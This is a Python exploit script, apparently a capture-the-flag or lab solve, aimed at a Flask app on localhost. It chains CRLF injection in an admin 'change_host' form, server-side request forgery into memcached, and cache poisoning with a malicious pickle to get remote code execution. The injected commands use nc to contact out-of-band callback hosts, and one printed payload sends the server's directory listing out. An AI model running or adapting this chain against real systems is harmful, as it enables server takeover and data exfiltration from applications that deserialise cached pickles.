import base64
import pickle

import requests


class PickleRCE(object):
    def __reduce__(self):
        import os

        return (
            os.system,
            (
                "printf \"GET /hallo HTTP/1.1\\r\\nHost: chrta049952mnd56r0pg7b7ywubh5cchu.oast.pro\\r\\n\\r\\n\" | nc chrta049952mnd56r0pg7b7ywubh5cchu.oast.pro 80",
            ),
        )

def test(url):
    get_stats = f"{url}/stats"
    change_host = f"{url}/admin/change_host"
    ch_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36",
        "X-Real-Host": "127.0.0.1",
    }

    payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()
    num_bytes = len(payload)

    print(
        f"0:11211/?wat\r\nset flask_cache_content 0 30 {num_bytes}\r\n{payload}\r\n:80/api/stats"
    )
    print(
        "0:11211/?wat\r\nset flask_cache_content 0 30 272\r\ngASVwAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjKVwcmludGYgIkdFVCAvJChscyB8IGJhc2U2NCB8IHRyIC1kICdcbicpIEhUVFAvMS4xXHJcbkhvc3Q6IGU4bmlsMHo4MGdnYjB2cjB0ZHZmdXgxMjF0N2t2YWp6Lm9hc3RpZnkuY29tXHJcblxyXG4iIHwgbmMgZThuaWwwejgwZ2diMHZyMHRkdmZ1eDEyMXQ3a3Zhanoub2FzdGlmeS5jb20gODCUhZRSlC4=\r\n:80/api/stats"
    )


    ch_data = {
        "host": f"0:11211/?wat\r\nset flask_cache_content 0 30 {num_bytes}\r\n{payload}\r\n:80/api/stats"
    }

    session = requests.Session()
    res = session.get(url)

    session.post(change_host, headers=ch_headers, data=ch_data)
    session.get(get_stats)
    res = session.get(get_stats)

if __name__ == '__main__':
    test('http://localhost:5000')
